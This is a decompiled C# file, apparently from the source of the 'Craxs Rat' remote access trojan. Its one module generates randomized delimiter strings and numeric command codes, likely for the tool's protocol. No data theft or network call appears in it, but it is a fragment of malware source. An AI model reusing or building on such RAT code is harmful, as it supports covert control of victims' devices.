using System;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000FA RID: 250
	[StandardModule]
	internal sealed class Module13
	{
		// Token: 0x06001240 RID: 4672 RVA: 0x000BE664 File Offset: 0x000BC864
		public static void smethod_0()
		{
			Module13.string_0 = Module13.smethod_1();
			Module13.string_7 = Module13.smethod_1();
			Module13.string_1 = Module13.smethod_1();
			Module13.string_3 = Module13.smethod_1();
			Module13.string_4 = Module13.smethod_1();
			Module13.string_5 = "ddll";
			Module13.string_6 = Module13.smethod_1();
			Module13.string_8 = Module13.smethod_1();
			Module13.string_9 = Module13.smethod_1();
			Module13.string_10 = Module13.smethod_1();
			Module13.string_12 = Module13.smethod_1() + ">";
			Module13.string_13 = Module13.smethod_1() + ">";
			Module13.string_14 = Module13.smethod_1();
			Module13.string_15 = Module13.smethod_1();
			Module13.string_16 = Module13.smethod_1();
			Module13.string_17 = Module13.smethod_1() + ">";
			Module13.string_18 = Module13.smethod_1();
			Module13.string_19 = Module13.smethod_1();
			Module13.string_20 = Module13.smethod_1();
			Module13.string_21 = Module13.smethod_1();
			Module13.string_22 = Module13.smethod_1();
			Module13.string_23 = Module13.smethod_1();
			Module13.string_11 = Module13.smethod_1();
			Module13.string_24 = Module13.smethod_1();
			Module13.string_25 = Module13.smethod_1();
			Module13.string_26 = Module13.smethod_1();
			Module13.string_27 = Module13.smethod_1();
			Module13.string_28 = "1";
			Module13.string_29 = "2";
			Module13.string_30 = "3";
			Module13.string_31 = "4";
			Module13.string_32 = "5";
			Module13.string_33 = "6";
			Module13.string_34 = "7";
			Module13.string_35 = "8";
			Module13.string_36 = "9";
			Module13.string_37 = "10";
			Module13.string_38 = "11";
			Module13.string_39 = "-2";
			Module13.string_40 = "-1";
		}

		// Token: 0x06001241 RID: 4673 RVA: 0x000BE820 File Offset: 0x000BCA20
		public static string smethod_1()
		{
			checked
			{
				Module13.int_0++;
				return Conversions.ToString(Module13.int_0) + Module13.smethod_2(3) + Conversions.ToString(DateTime.Now.Millisecond);
			}
		}

		// Token: 0x06001242 RID: 4674 RVA: 0x000BE864 File Offset: 0x000BCA64
		public static string smethod_2(int int_1)
		{
			string text = null;
			string text2 = "qazwsxedcrfvtgbyhnujmikolp";
			checked
			{
				for (int i = 1; i <= int_1; i++)
				{
					Thread.Sleep(5);
					Random random = new Random(DateAndTime.Now.Millisecond);
					text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
				}
				return text;
			}
		}

		// Token: 0x04000A02 RID: 2562
		public static string string_0 = null;

		// Token: 0x04000A03 RID: 2563
		public static string string_1 = null;

		// Token: 0x04000A04 RID: 2564
		public static string string_2 = null;

		// Token: 0x04000A05 RID: 2565
		public static string string_3 = null;

		// Token: 0x04000A06 RID: 2566
		public static string string_4 = null;

		// Token: 0x04000A07 RID: 2567
		public static string string_5 = null;

		// Token: 0x04000A08 RID: 2568
		public static string string_6 = null;

		// Token: 0x04000A09 RID: 2569
		public static string string_7 = null;

		// Token: 0x04000A0A RID: 2570
		public static string string_8 = null;

		// Token: 0x04000A0B RID: 2571
		public static string string_9 = null;

		// Token: 0x04000A0C RID: 2572
		public static string string_10 = null;

		// Token: 0x04000A0D RID: 2573
		public static string string_11 = null;

		// Token: 0x04000A0E RID: 2574
		public static string string_12 = null;

		// Token: 0x04000A0F RID: 2575
		public static string string_13 = null;

		// Token: 0x04000A10 RID: 2576
		public static string string_14 = null;

		// Token: 0x04000A11 RID: 2577
		public static string string_15 = null;

		// Token: 0x04000A12 RID: 2578
		public static string string_16 = null;

		// Token: 0x04000A13 RID: 2579
		public static string string_17 = null;

		// Token: 0x04000A14 RID: 2580
		public static string string_18 = null;

		// Token: 0x04000A15 RID: 2581
		public static string string_19 = null;

		// Token: 0x04000A16 RID: 2582
		public static string string_20 = null;

		// Token: 0x04000A17 RID: 2583
		public static string string_21 = null;

		// Token: 0x04000A18 RID: 2584
		public static string string_22 = null;

		// Token: 0x04000A19 RID: 2585
		public static string string_23 = null;

		// Token: 0x04000A1A RID: 2586
		public static string string_24 = null;

		// Token: 0x04000A1B RID: 2587
		public static string string_25 = null;

		// Token: 0x04000A1C RID: 2588
		public static string string_26 = null;

		// Token: 0x04000A1D RID: 2589
		public static string string_27 = null;

		// Token: 0x04000A1E RID: 2590
		public static string string_28 = null;

		// Token: 0x04000A1F RID: 2591
		public static string string_29 = null;

		// Token: 0x04000A20 RID: 2592
		public static string string_30 = null;

		// Token: 0x04000A21 RID: 2593
		public static string string_31 = null;

		// Token: 0x04000A22 RID: 2594
		public static string string_32 = null;

		// Token: 0x04000A23 RID: 2595
		public static string string_33 = null;

		// Token: 0x04000A24 RID: 2596
		public static string string_34 = null;

		// Token: 0x04000A25 RID: 2597
		public static string string_35 = null;

		// Token: 0x04000A26 RID: 2598
		public static string string_36 = null;

		// Token: 0x04000A27 RID: 2599
		public static string string_37 = null;

		// Token: 0x04000A28 RID: 2600
		public static string string_38 = null;

		// Token: 0x04000A29 RID: 2601
		public static string string_39 = null;

		// Token: 0x04000A2A RID: 2602
		public static string string_40 = null;

		// Token: 0x04000A2B RID: 2603
		private static int int_0;
	}
}
